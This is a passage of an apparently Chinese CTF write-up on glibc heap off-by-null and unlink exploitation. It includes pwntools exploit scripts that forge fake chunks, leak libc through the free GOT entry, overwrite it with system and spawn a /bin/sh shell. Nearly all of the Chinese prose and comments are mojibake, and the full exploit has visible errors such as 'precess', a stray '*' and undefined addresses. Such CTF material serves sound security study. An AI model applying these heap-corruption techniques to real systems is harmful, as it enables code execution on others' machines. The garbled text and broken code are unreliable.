payload = p64(0x100)#prev_size
payload += p64(0xf1)#size
payload += p64(next_chunk_addr - 0x18)#fd
payload += p64(next_chunk_addr - 0x10)#bk
payload += b'a'*0xd0#å †çš„å¤§å°å‡å»ä¼ªé€ çš„heapå¤´ï¼Œ0x110-0x8*5
payload += b'0xf0'#next_prev_size
edit(1,payload)
delete(2)#è§¦å‘unlinkï¼Œé€ æˆå †å 

payload1 = p64(0xf8)#size
payload1 += p64(free_got_addr)#åˆ©ç”¨å †å æ›´æ”¹chunk1çš„æŒ‡é’ˆä¸ºfreeçš„gotè¡¨
edit(1,payload1)
show(1)#æ­¤æ—¶æ‰“å°å‡ºchunk1çš„å†…å®¹ï¼Œå³ä¸ºfreeçš„çœŸå®åœ°å€

#leak
free_addr = u64(r.recvuntil("DOWNLOAD SUCCESFULLY")[:-5].ljust(8,"\x00"))
libc_base = free_addr - libc.symbols['free']
print(hex(libc_base))
system_addr = libc_base + libc.symbols['system']

edit(1,p64(system_addr))#æ›´æ”¹freeçš„gotè¡¨å€¼ä¸ºsystemå‡½æ•°çš„çœŸå®åœ°å€
edit(0,"/bin/sh\x00")#å°†chunk0çš„å†…å®¹å¡«å……ä¸ºbinshï¼Œä½œä¸ºä¸‹é¢æ‰§è¡Œå‡½æ•°çš„å‚æ•°
delete(0)#ç”±äºfreeçš„gotè¡¨å€¼å·²ç»è¢«ç¯¡æ”¹ä¸ºsystemï¼Œæ‰€ä»¥è°ƒç”¨freeå³è°ƒç”¨systemã€‚

r.interactive()
</code></pre>
<h4 id="3ï¼‰level2-harder-unlink">3ï¼‰level2-harder_unlink<a class="post-anchor" href="#3ï¼‰level2-harder-unlink"></a></h4><p>2.29ä»¥åglibcä»£ç ä¸­å¢åŠ äº†å¯¹äºprev_sizeçš„æ£€æµ‹</p>
<pre><code class="c">/* consolidate backward */
if (!prev_inuse(p)) {
    prevsize = prev_size (p);
    size += prevsize;
    p = chunk_at_offset(p, -((long) prevsize));
    if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
    unlink_chunk (av, p);
}
</code></pre>
<p>æ¥å¯¹æŠ—å•å­—èŠ‚æº¢å‡ºã€‚</p>
<p>æ£€æµ‹çš„å†…å®¹ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå¦‚æœå½“chunkçš„<code>size</code>ä½å¦‚æœä¸next chunkçš„<code>prev_size</code>ä½ä¸ç›¸ç­‰å³æŠ¥é”™ã€‚è¿™ä¸ªæ£€æµ‹ä½¿æˆ‘ä»¬å¾ˆéš¾ç›´æ¥é€šè¿‡å•å­—èŠ‚æº¢å‡ºæ¥æ§åˆ¶prev sizeä½ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å¦‚ä½•ç»•è¿‡å®ƒå‘¢ï¼Ÿ</p>
<p>å¾ˆè‡ªç„¶åœ°æˆ‘ä»¬æƒ³åˆ°å¯ä»¥æ›´æ”¹next chunkçš„<code>prev_size</code>ï¼Œä½†æ˜¯ä»”ç»†æƒ³æƒ³å°±ä¼šå‘ç°è¿™æ˜¯ä¸ªæ— å°½å¥—å¨ƒã€‚åŸºæœ¬ä¸å¯èƒ½ã€‚</p>
<p>æ—¢ç„¶æƒ³ä¸å‡ºç®€å•çš„åŠæ³•ç»•è¿‡ï¼Œé‚£æˆ‘ä»¬å°±å¹²è„†ä¸ä¿®æ”¹<code>prev_size</code>äº†ã€‚</p>
<p>ä¸€èˆ¬çš„poison null byteæ˜¯é€šè¿‡ä¼ªé€ fdå’Œbkä½æ¥ä¼ªé€ fake chunkçš„åœ°å€ï¼Œä½¿å¾—åœ°å€å‘ä½åœ°å€ç§»åŠ¨ï¼Œæ—¢ç„¶ç°åœ¨ä¸å¥½æ§åˆ¶ï¼Œé‚£ä¹ˆå¦‚æœå†…å­˜ä¸Šæœ‰ç°æˆçš„fdå’Œbkä¾›æˆ‘ä»¬åˆ©ç”¨å‘¢ï¼Ÿæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥æ§åˆ¶fake chunkâ€”-ç¡®æœ‰å…¶äº‹ï¼Œæ¯”å¦‚è¯´largebin chunkçš„<code>fd_nextsize</code>,<code>bk_nextsize</code>ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä»¥<code>fd_nextsize</code>ä½œä¸ºfake chunkçš„fdï¼Œ<code>bk_nextsize</code>ä½œä¸ºfake chunkçš„bkã€‚</p>
<p>ç”±äº<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>ç”¨äºæŒ‡å‘ç¬¬ä¸€ä¸ªä¸è‡ªå·±å¤§å°ä¸åŒçš„chunkï¼Œå½“largebinä¸­åªæœ‰ä¸€ä¸ªchunkï¼Œè¿™ä¸¤ä¸ªæŒ‡é’ˆéƒ½æ˜¯æŒ‡å‘chunkæœ¬èº«ã€‚</p>
<p><strong>å…·ä½“è§extraéƒ¨åˆ†ä¸­å¯¹äºlargebinçš„æ¦‚è¿°ã€‚</strong></p>
<p>åˆ©ç”¨æ–¹å¼åˆ™æ˜¯ï¼š</p>
<ol>
<li><p>ç”³è¯·ä¸¤ä¸ªè¾ƒå¤§çš„chunkåå†é‡Šæ”¾ï¼Œè¦æ±‚chunkè¿›å…¥unsorted binã€‚</p>
</li>
<li><p>å°†ä¸€ä¸ªlargebinç”³è¯·å›æ¥ã€‚</p>
</li>
<li><p>åœ¨è¿™ä¸ªlargebin chunkAå†…æ„é€ fakeã€‚åœ¨åŸæœ¬chunkAçš„bkä½ç½®å†™fake chunkçš„sizeä½ï¼Œä¹Ÿå°±æ˜¯å°†fake chunkæ„å»ºåœ¨chunk+0x10å¤„ã€‚</p>
</li>
<li><p>ç„¶åå¤„ç†fake chunkçš„fdå’Œbkä½ã€‚ç›®çš„æ˜¯ä»¥chunkAçš„<code>fd_nextsize</code>æŒ‡é’ˆä½œä¸ºfake chunkçš„fdä½ï¼Œ<code>bk_nextsize</code>æŒ‡é’ˆä½œä¸ºfake chunkçš„bkã€‚é¦–å…ˆæ˜¯fake chunkçš„fdä½ï¼ŒæŠŠchunkAçš„<code>fd_nextsize</code>æŒ‡é’ˆè¦†ç›–åˆ°ä¸€ä¸ªå¯ä»¥æ§åˆ¶çš„å…¶bkä½çš„ chunkBä¸Šï¼Œå†ä¼ªé€ chunkBçš„bkä½ä½¿å…¶æŒ‡å‘fake chunkå³å¯ã€‚</p>
</li>
<li><p>å¯¹äºfake chunkçš„bkä½ï¼ŒæŒ‰ç…§æ£€æµ‹ï¼Œè¦è§¦å‘unlinkï¼Œbkå¿…é¡»æŒ‡å‘fake chunkæœ¬èº«ï¼Œä¹Ÿå°±æ˜¯chunkA+0x10å¤„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨fastbinçš„ç‰¹æ€§ï¼Œå°†ä¸€ä¸ªfastbin chunkä½œä¸ºè·³æ¿ç»•è¿‡ã€‚</p>
</li>
<li><p>fake chunkæ„é€ å®Œæˆåç›´æ¥free chunkAï¼Œè§¦å‘unlinkï¼Œé€ æˆå †å ã€‚å¯ä»¥åˆ©ç”¨å®ƒleakï¼Œç„¶åæ”¹free gotè¡¨ã€‚</p>
</li>
</ol>
<p>æˆ‘ä»¬é€šè¿‡expå’Œå›¾ç¤ºæ¥ç†æ¸…æ¥šã€‚</p>
<p>ç”±äºå¹¶æ²¡æœ‰å¼€å¯åœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥åœ°å€çš„è¦†ç›–å¹¶ä¸éœ€è¦éƒ¨åˆ†è¦†å†™ã€‚</p>
<p>å‰ä¸‰æ­¥å¯ä»¥ç”¨ä¸‹é¢çš„å›¾è¡¨æ¥è¯´æ˜ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20210715135602230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135602230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></a></p>
<p>é¦–å…ˆå°†tcacheå¡«æ»¡ã€‚</p>
<pre><code class="python">for a in range(7):
    add(0x1000,b'fill')
    delete(a)

for b in range(7):
    add(0x1020,b'fill')
    delete(b)

for c in range(7):
    add(0x20,b'fill')
    delete(c)
</code></pre>
<p>ç„¶åè®©chunk21æˆä¸ºlargebin chunk</p>
<pre><code class="python">add(0x500,b'largebin chnuk0')#chunk21
add(0x20,b'top')#chunk22
delete(21)
add(0x1000,b'functional gadgets')#chunk23,to push the chunk21 to largebin
#æœ‰å…³è¿™ä¸€æ­¥çš„å…·ä½“è¯´æ˜å¯ä»¥çœ‹Tcacheéƒ¨åˆ†ã€‚
</code></pre>
<p>è‡³æ­¤æˆ‘ä»¬è·å¾—äº†ä¸€ä¸ª0x500å¤§å°çš„largebin chunkAï¼Œæ­¤æ—¶è¿™ä¸ªchunkAçš„çŠ¶æ€è¿˜æ˜¯freeã€‚</p>
<p>ç„¶åæˆ‘ä»¬è¦åœ¨chunkAçš„headerå¼€å§‹ä¼ªé€ fake chunkã€‚</p>
<p>è¿™æ˜¯æ¯”è¾ƒå…³é”®çš„ä¸€éƒ¨åˆ†ã€‚åˆ©ç”¨åˆ°äº†large biné—ç•™åœ¨å†…å­˜ä¸Šçš„<code>fd_nextsize</code> å’Œ <code>bk_nextsize</code> æŒ‡é’ˆã€‚ä»¥ <code>fd_nextsize</code> ä¸º fake_chunk çš„ fdï¼Œ<code>bk_nextsize</code> ä¸º fake_chunk çš„ bkã€‚ä½†æ˜¯æˆ‘ä»¬é¦–å…ˆéœ€è¦ç»•è¿‡unlinkçš„å®‰å…¨æ£€æµ‹ï¼Œå³ä¹‹å‰è¯´è¿‡çš„<code>Fd-&gt;bk = p, BK-&gt;fd = p</code></p>
<p>psï¼šæˆ‘ä»¬ä¼ªé€ çš„fake chunkæ˜¯smallbin chunkï¼Œåœ¨binä¸­ä¹Ÿæ˜¯ç”±åŒå‘é“¾è¡¨ç»´æŠ¤ã€‚</p>
<p>æˆ‘ä»¬åˆ†åˆ«ä¸º<code>FD-&gt;bk = p</code>å’Œ<code>BK-&gt;fd = p</code>è¿›è¡Œç»•è¿‡</p>
<p>é¦–å…ˆæ˜¯<code>FD-&gt;bk = p</code>çš„ç»•è¿‡ã€‚</p>
<p>å›å¿†ä¸€ä¸‹ä¹‹å‰level1æˆ‘ä»¬ç»•è¿‡çš„æ–¹æ³•è®ºï¼Œä¹Ÿå°±æ˜¯ï¼š</p>
<pre><code>FD-&gt;bk = p   ==&gt; bk_nextsize = p
</code></pre>
<p>æ‰€ä»¥æˆ‘ä»¬çš„ç›®çš„æ˜¯è®©<code>bk_nextsize</code>æŒ‡å‘fake chunkã€‚</p>
<p><code>BK-&gt;fd = p</code>çš„ç»•è¿‡åŒç†ï¼Œç­‰ä»·äºæ„é€ <code>fd_nextsize</code>ï¼Œä½¿å®ƒæŒ‡å‘fake chunkã€‚</p>
<p>ä½†æ˜¯æœ‰è¶£çš„æ˜¯æ­¤æ—¶æˆ‘ä»¬çš„largebinä¸­åªæœ‰ä¸€ä¸ªlargebin chunkï¼Œå®ƒçš„<code>fd_nextsize</code>,<code>bk_nextsize</code>æœ¬èº«å°±æ˜¯æŒ‡å‘chunkæœ¬èº«çš„ã€‚ç„¶è€Œè¿™æ ·æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹<code>fd_nextsize</code>åˆ°æˆ‘ä»¬éœ€è¦çš„åœ°æ–¹ã€‚</p>
<p>è¿™ä¾¿åˆæ˜¯é—®é¢˜æ‰€åœ¨ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•ä½¿å¾—ä¿®æ”¹<code>fd_nextsize</code>çš„åŒæ—¶åˆèƒ½ç»•è¿‡æ£€æµ‹ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬éœ€è¦ç”¨åˆ°å…¶ä»–ç±»å‹bin chunkçš„è¾…åŠ©ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°æ§åˆ¶<code>fd_nextsize</code>æŒ‡å‘æŸä¸ªsmallbin chunkCï¼Œè€Œè¿™ä¸ªsmallbin chunkCçš„fdä¹ŸæŒ‡å‘å †ä¸Šçš„æŸä¸ªåœ°å€ã€‚æˆ‘ä»¬åˆå¯ä»¥é€šè¿‡ä¿®æ”¹è¿™ä¸ªchunkCçš„fdæŒ‡é’ˆä½¿å¾—å®ƒæŒ‡å‘fake chunkã€‚è¿™æ ·ä¸€æ¥æˆ‘ä»¬åˆ©ç”¨ chunkCå……å½“ä¸­é—´è§’è‰²ï¼Œç»•äº†ä¸€åœˆä½¿å¾—æˆ‘ä»¬ç›®çš„è¾¾æˆçš„åŒæ—¶ä¹Ÿæ²¡æœ‰è¢«æ£€æµ‹ç»Šä½ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20210715135622971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135622971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></a></p>
<p>ç„¶åæ¥çœ‹å®é™…æ“ä½œã€‚</p>
<pre><code class="python">add(0x28,p64(0) + p64(0x530) + p64(chunkC_addr))#fake chunk 
</code></pre>
<p>å…ˆç”³è¯·ä¸€ä¸ªchunkBï¼Œç”¨æ¥æ„é€ fake chunkçš„sizeå’ŒfdæŒ‡é’ˆã€‚è¿™é‡Œfake chunk fdè¿˜åªæ˜¯æŒ‡å‘chunkCï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹chunkCçš„fdæŒ‡é’ˆä½¿å®ƒæŒ‡å‘fake chunkã€‚</p>
<p>ä¿®æ”¹chunk headeréœ€è¦åˆ©ç”¨åˆ°æ‚¬å‚æŒ‡é’ˆã€‚æˆ‘ä»¬ä¸‹ä¸€æ­¥åº”è¯¥æ˜¯æ„é€ å‡ºchunkCçš„æ‚¬å‚æŒ‡é’ˆã€‚</p>
<p>æ¯”å¦‚ä» small binä¸­æ‹¿å‡ºçš„chunkï¼Œå¦‚æœå…¶binä¸­æœ‰å¤šä¸ªchunkçš„è¯ï¼Œé‚£ä¹ˆæ‹¿å‡ºæ¥çš„chunkçš„bkä¸Šå¿…å®šæ®‹ç•™äº†æŒ‡é’ˆï¼Œå› æ­¤å¯ä»¥è¿›è¡Œè¦†ç›–ã€‚</p>
<p>è¿™é‡Œç¨å¾®æœ‰ä¸€äº›èƒ½è®²çš„åŸºç¡€çŸ¥è¯†ã€‚è¿˜æ˜¯å‚è§extraå§ã€‚</p>
<pre><code class="python">add(0x28,b'a') #24
add(0x28,b'a') #25
add(0x28,b'a') #26
add(0x28,b'a') #27
add(0x600,b'a') #28,off by null
for i in range(7):
    add(0x28,'tcache')
for i in range(7):
    delete(23 + i)#å¡«å……tcache
</code></pre>
<p>å¤šç”³è¯·ä¸€äº›chunkã€‚</p>
<pre><code>delete(24)
delete(25)
#å°†chunk24ï¼Œ25freeåˆ°fastbin
add(0x400,b'aa')#28ï¼Œsmallbin
#ç”³è¯·chunk28åfastbiné‡Œçš„ä¸¤ä¸ªchunkè¢«æ”¾å…¥small binã€‚è¿™é‡Œçš„ç›¸å…³æœºåˆ¶å¯ä»¥æ¥çœ‹çœ‹extraã€‚
add(0x28,p64(fake_chunk_addr))#24ï¼Œå†æ¬¡ç”³è¯·ï¼Œå †ä¸Šé—ç•™äº†bkæŒ‡é’ˆï¼Œå¯ä»¥ç›´æ¥è¦†ç›–ä¸ºç›®æ ‡åœ°å€
</code></pre>
<p>è¿™æ ·ä¸€æ¥æˆ‘ä»¬æˆåŠŸä½¿å¾—fdä½æŒ‡å‘fake chunkï¼Œå¹¶ç»•è¿‡äº†<code>FD-&gt;bk = p</code>   </p>
<p>ç„¶åæ˜¯<code>bk_nextsize = p</code>çš„ç»•è¿‡ï¼š</p>
<p>å› ä¸º<code>bk_nextsize</code>æœ¬èº«æŒ‡å‘chunkAï¼Œæˆ‘ä»¬è¿˜æ˜¯éœ€è¦ä¼ªé€ å®ƒä½¿å¾—<code>bk_nextsize</code>æŒ‡å‘chunkA + 0x10ã€‚</p>
<p>å¯¹äºè¿™ä¸ªæ£€æµ‹æˆ‘ä»¬ä¾æ—§è¦åˆ©ç”¨åˆ°åˆ«çš„chunkçš„å¸®åŠ©</p>
<pre><code class="python">for i in range(7):
    add(0x28,'tcache')
for i in range(7):
    delete(28 + i)#å¡«å……tcache
    
add(0x28, 'a')*#23,Tcache

free(20)
free(23) 

for i in range(7):
 add(0x28, 'a')

add(0x28, p64(fake_chunk_addr))
</code></pre>
<p>ç„¶åè¿›è¡Œunlinkã€‚</p>
<p>unlinkçš„è§¦å‘å®é™…ä¸Šåªéœ€è¦ç”¨off by nullå‘ä¸‹ä¸€ä¸ªchunkæº¢å‡ºç©ºå­—èŠ‚ï¼Œå†freeè¢«æº¢å‡ºçš„chunkå°±è¡Œ</p>
<pre><code class="python">add(0x28,b'aa')
edit(28,b'a'*0x20 + p64(0x520))
delete(28)
</code></pre>
<p>æ•´ä¸ªè¿‡ç¨‹çš„ç¤ºæ„å›¾å¦‚ä¸‹ï¼šå…¶ä¸­chunk ptræŒ‡large binæ®‹ç•™çš„æŒ‡é’ˆã€‚</p>
<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20210715135730274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135730274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></a></p>
<p>å®Œæ•´expï¼š</p>
<pre><code class="python">from pwn import *

r = precess('./summer2')
context.log_level = 'debug'
libc = ELF('./libc-2.29.so')
unlink_addr = 0x6024b0
free_got_addr = 0x4036E8
next_chunk_addr = unlink_addr

def add(size,content):
    r.sendline("1")
    r.sendafter(":",str(size))
    r.sendafter(":",content)

def delete(idx):
    r.sendline("2")
    r.sendafter(":",str(idx))

def show(idx):
    r.sendline("3")
    r.sendafter(":",str(idx))

def edit(idx,content):
    r.sendline("4")
    r.sendafter(":",str(idx))
    r.sendafter(":",str(content))

def dbg():
    gdb.attach(r)
    pause()


#----------------Tcache-------------------
for a in range(7):
    add(0x1000,b'fill')
    delete(a)

for b in range(7):
    add(0x1020,b'fill')
    delete(b)

for c in range(7):
    add(0x20,b'fill')
    delete(c)
#-----------chunk constrution--------------

add(0x500,b'largebin chnuk0')#chunk21
add(0x20,b'top')#chunk22
delete(21)
add(0x1000,b'functional gadgets')#chunk23,to push the chunk21 to largebin

#-------fake chunk construction------------

add(0x28,p64(0x530) + p64(chunkC_addr))#fake chunk 

add(0x28,b'a') #24
add(0x28,b'a') #25
add(0x28,b'a') #26
add(0x28,b'a') #27
add(0x600,b'a') #28,off by null
for i in range(7):
    add(0x28,'tcache')
for i in range(7):
    delete(23 + i)#å¡«å……tcache

#-------FD-&gt;bk = p-------------------------
delete(24)
delete(25)
#å°†chunk24ï¼Œ25freeåˆ°fastbin
add(0x400,b'aa')#28ï¼Œsmallbin
#ç”³è¯·chunk28åfastbiné‡Œçš„ä¸¤ä¸ªchunkè¢«æ”¾å…¥small binã€‚
add(0x28,p64(fake_chunk_addr))#24ï¼Œå†æ¬¡ç”³è¯·ï¼Œå †ä¸Šé—ç•™äº†bkæŒ‡é’ˆï¼Œå¯ä»¥ç›´æ¥è¦†ç›–ä¸ºç›®æ ‡åœ°å€
#-------BK-&gt;fd = p-------------------------
for i in range(7):
    add(0x28,'tcache')
for i in range(7):
    delete(28 + i)#å¡«å……tcache
    
add(0x28, 'a')*#23,Tcache

free(20)
free(23) 

for i in range(7):
 add(0x28, 'a')

add(0x28, p64(fake_chunk_addr))


#-------unlink-----------------------------

add(0x28,b'aa')
edit(28,b'a'*0x20 + p64(0x520))
delete(28)

#-------leak-------------------------------
show(21)
free_addr = u64(r.recvuntil("DOWNLOAD SUCCESFULLY")[:-5].ljust(8, "\x00"))
libc_base = free_addr - libc.symbols['free']
print(hex(libc_base))
system_addr = libc_base + libc.symbols['system']
edit(1, p64(system_addr))
show(1)
delete(0)


r.interactive()
</code></pre>
<h2 id="4-æ€»ç»“">4)æ€»ç»“<a class="post-anchor" href="#4-æ€»ç»“"></a></h2><p>ä¸ç®¡æ˜¯level0è¿˜æ˜¯level1ã€level2ï¼Œå…¶å®éƒ½æ˜¯off by oneåºå¤§åˆ©ç”¨æ–¹å¼ä¸­æ¯”è¾ƒåŸºç¡€çš„ç‚¹ã€‚</p>
<p>level2çš„æ€è·¯å¾ˆæœ‰è¶£ã€‚</p>
<p>ä¸ç®¡æ€æ ·ä¸‡å˜ä¸ç¦»å…¶ä¸­ï¼Œoff by one/nullå¯ä»¥å¯¼è‡´ä¸€ä¸ªå­—èŠ‚çš„çš„æº¢å‡ºä»¥ä¿®æ”¹chunk headerï¼Œä»è€Œè§¦å‘å„ç§å„æ ·çš„æ¼æ´åˆ©ç”¨ã€‚</p>
<h2 id="5ï¼‰å†›è®­ï¼Ÿè€ƒæ ¸ï¼Ÿå¤§å†’é™©ï¼">5ï¼‰å†›è®­ï¼Ÿè€ƒæ ¸ï¼Ÿå¤§å†’é™©ï¼<a class="post-anchor" href="#5ï¼‰å†›è®­ï¼Ÿè€ƒæ ¸ï¼Ÿå¤§å†’é™©ï¼"></a></h2><p>åŸæœ¬æ˜¯è®¡åˆ’ä¸‰é“é¢˜ã€‚ä¸€é“full relroçš„ret2dlï¼Œä¸€é“å¤šçº¿ç¨‹æˆ–è€…xteaåŠ å¯†çš„reï¼Œä¸€é“ç®€å•off by oneï¼ˆå°±æ˜¯summerï¼‰ã€‚</p>
<p>åœ¨å†›è®­ä¸€å¤©åè§‰å¾—å‡ºä¸‰é“é¢˜ï¼Œè¿™ç¡®å®æ˜¯ä¸å¯èƒ½çš„äº‹ã€‚ç´¯å€’ä¸ç´¯ï¼Œä¸»è¦æ˜¯æ—¶é—´éƒ½æ˜¯ç¢ç‰‡åŒ–çš„ä¸å¥½åˆ©ç”¨ã€‚</p>
<p>å½“æ—¶è€ƒæ ¸å‘å¸ƒçš„æ—¶å€™æˆ‘ä»¬éƒ½è§‰å¾—æ—¶é—´æ˜¯å……è¶³çš„ï¼Œèƒ½å…ˆèŠ±æ—¶é—´å­¦è€ƒç‚¹è€Œä¸æ˜¯ç ”ç©¶æ€ä¹ˆåšè€ƒæ ¸ã€‚å®é™…ä¸Šè€ƒæ ¸ä¸€å…¬å¸ƒæˆ‘å°±å†™äº†summerçš„å¤§æ¦‚æ¡†æ¶ï¼Œä¹‹å‰æ²¡æœ‰æ€ä¹ˆä»æºç å±‚é¢ä¸Šé˜…è¯»å †é¢˜ï¼Œç”šè‡³é‚£ä¸ªæ—¶å€™ä¹Ÿæ˜¯åˆšåˆšæ¥è§¦å †åŠä¸ªæœˆï¼Œæ‰€ä»¥å†™å¾—å¾ˆè‰°éš¾ï¼Œå¤§æ¦‚èŠ±äº†ä¸€å‘¨çš„æ—¶é—´æŠŠç¨‹åºå®Œå–„ã€‚åæ¥å‘ç°äº†ä¸€ä¸ªå¾ˆä¸¥é‡çš„éé¢„æœŸï¼Œè§‰å¾—è‡ªå·±æœ‰ç‚¹æ€¥äºæ±‚æˆï¼Œå¯¹å †ä¸€çŸ¥åŠè§£çš„å°±æƒ³å‡ºå †é¢˜æ˜¯ä¸æ˜¯æœ‰ç‚¹ä¸è¯†å¥½æ­¹äº†ï¼Œå°±æš‚æ—¶æ”¾ä¸‹äº†è€ƒæ ¸è€Œå¼€å§‹ç ”ç©¶å †é¢˜çš„è€ƒç‚¹ã€‚è¿™æœŸé—´æˆ‘ä¹Ÿä¸€ç›´è®¤ä¸ºå†›è®­å®Œè¿˜æœ‰å……è¶³çš„æ—¶é—´æ¥å®Œå–„é¢˜ç›®ã€‚</p>
<p>å†åæ¥ä¸‰é“é¢˜å˜æˆäº†ä¸€é“é¢˜ã€‚</p>
<p>å¾ˆé—æ†¾æ²¡æœ‰åœ¨è€ƒæ ¸æœŸé—´å®Œæˆfull relroçš„ret2dlã€‚ã€‚ä¸è¿‡æœ‰æ²¡æœ‰ä½œä¸ºè€ƒæ ¸å®Œæˆä¹Ÿä¸æ˜¯ç‰¹åˆ«é‡è¦äº†ï¼Œæˆ‘å·²ç»éƒ¨åˆ†ç¿»è¯‘äº†åŸæ–‡ç›¸å…³çš„éƒ¨åˆ†ï¼Œæ‰“ç®—æš‘å‡è®¤çœŸè°ƒè¯•ä¸€ä¸‹ã€‚ã€‚ã€‚</p>
<p>å¤§æ¦‚ä¸ƒå·çš„æ—¶å€™å°±å®Œæˆäº†level0å’Œ1ï¼Œæœ¬æ¥æœ€åˆè®¡åˆ’å°±æ˜¯è¿™ä¸¤ä¸ªlevelçš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæƒ³ä¸å¼€åŠ äº†level2ï¼Œå­¦å¾—å¾ˆè‰°éš¾ã€‚å¹¶ä¸”</p>
<p>æ„Ÿè§‰å†™çš„æ”¯ç¦»ç ´ç¢çš„ï¼Œè¯´ç™½äº†æˆ‘çš„çŸ¥è¯†é¢ä¸è¶³ä»¥æ”¯æ’‘æˆ‘å®Œå…¨ç†è§£è¿™ä¸ªæ£€æµ‹çš„ç»•è¿‡æ–¹æ³•ï¼Œæ‰€ä»¥ä¸€äº›ä¸œè¥¿å†™å¾—ååˆ†ç¦»å¥‡ã€‚æ¯”å¦‚é€šç¯‡å‡ ä¹æ²¡æœ‰ç”¨åˆ°editåŠŸèƒ½ï¼Œå› ä¸ºå‚è€ƒçš„wpçš„åŸé¢˜éƒ½æ˜¯æ²¡æœ‰è¿™ä¸ªåŠŸèƒ½çš„ã€‚</p>
<p>å¾ˆè®©æˆ‘æ¼ç«çš„å°±æ˜¯æˆ‘å¯¹äºlargebinã€smallbinè¿˜æœ‰Tcacheçš„æœºåˆ¶ä¸ç”šç†Ÿæ‚‰ï¼Œè€Œè§£é¢˜ä¸­æ¶‰åŠåˆ°çš„å †æŒ‡é’ˆè¦†å†™çš„å¾ˆå¤šå§¿åŠ¿å®é™…ä¸Šéƒ½æ˜¯åŸºäºè¿™äº›binç‰¹æœ‰çš„æœºåˆ¶ã€‚</p>
<p>è¯´å®è¯æœ‰ç‚¹æƒ­æ„§ï¼Œå¤§ä¸€ä¸Šæˆ‘å¹²äº†å•¥å‘¢ã€‚å•¥ä¹Ÿæ²¡å¹²ã€‚</p>
<p>ç¡¬ç€å¤´çš®çœ‹ğŸŸæœ€æ—©åˆ†äº«çš„é•¿äº­äºŒè¿›åˆ¶å…¥é—¨è¯¾ï¼Œé‚£æ—¶æˆ‘æ„¿ç§°ä¹‹ä¸ºå¤©ä¹¦ã€‚</p>
<p>åšç­¾åˆ°æ ˆæº¢å‡ºï¼Œå¤åˆ¶åˆ«äººçš„expæ‰“ï¼ŒæåŠå¤©éƒ½è¿æ¥å¤±è´¥ï¼Œæ­»ä¹Ÿæ‰“ä¸é€šã€‚</p>
<p>å°±è·Ÿå¿˜è®°äº†å½“åˆä¸ºä»€ä¹ˆè¦å­¦ä¹ äºŒè¿›åˆ¶ä¸€æ ·ï¼Œæˆ‘ä¹Ÿå¿˜è®°äº†å½“æ—¶ä¸ºä»€ä¹ˆæˆ‘è¦æ¯å¤©æ™šä¸Šçœ‹é‚£ä¸ªnepçš„ç›´æ’­è¯¾ï¼Œå¿˜è®°åšè€ƒæ ¸çš„é‚£ç§ä¸åšå‡ºæ¥å°±è·³æ¥¼çš„å†³å¿ƒæ¥è‡ªå“ªé‡Œã€‚</p>
<p>ç›¸ä¼¼åœ°ï¼Œæˆ‘è¿˜å¿˜è®°äº†æˆ‘ä¸ºä»€ä¹ˆè¦å­¦pwnï¼Œè€Œä¸æ˜¯æˆ‘æ¯”è¾ƒæ†§æ†¬çš„æ¸¸æˆå®‰å…¨ã€‚</p>
